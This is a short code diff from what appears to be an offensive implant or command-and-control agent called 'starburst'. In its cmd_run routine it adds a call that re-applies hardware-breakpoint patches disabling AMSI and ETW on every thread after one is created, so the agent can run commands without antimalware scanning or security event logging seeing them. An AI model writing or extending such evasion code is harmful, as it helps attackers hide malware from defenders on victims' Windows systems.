@@ -151,6 +151,11 @@ auto declfn starburst::cmd_run(
         reinterpret_cast<LPTHREAD_START_ROUTINE>( run_thread_fn ),
         ctx, 0, nullptr );
 
+    /* new thread = fresh DRs; re-apply ETW/AMSI hwbp to all threads */
+    #if (defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)) && defined(_WIN64)
+        evasion_hwbp_repatch( inst );
+    #endif
+
     if ( !h_thread ) {
         SCALL( inst, kernel32.TerminateProcess, pi.hProcess, 0 );
         SCALL( inst, kernel32.CloseHandle, pi.hProcess );
